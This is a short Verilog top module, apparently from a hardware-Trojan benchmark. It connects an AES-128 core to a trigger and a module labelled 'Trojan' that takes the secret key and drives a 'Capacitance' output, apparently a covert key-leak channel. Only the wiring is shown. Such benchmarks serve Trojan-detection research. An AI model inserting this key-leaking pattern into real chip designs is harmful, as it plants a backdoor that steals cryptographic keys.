`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    12:02:52 03/06/2013 
// Design Name: 
// Module Name:    top 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module top(
    input clk,
    input rst,
    input [127:0] state,
    input [127:0] key,
    output [127:0] out,
	 output [63:0] Capacitance,

    );
	wire [1:0] Tj_Trig;
	//wire [1:0] Tj_Trig;
	aes_128 AES (clk, state, key, out); 
	Detrust Trigger (state[31:0], clk, Tj_Trig[0], Tj_Trig[1]); 
	TSC Trojan (rst, clk, Tj_Trig, key, state, Capacitance); 

endmodule
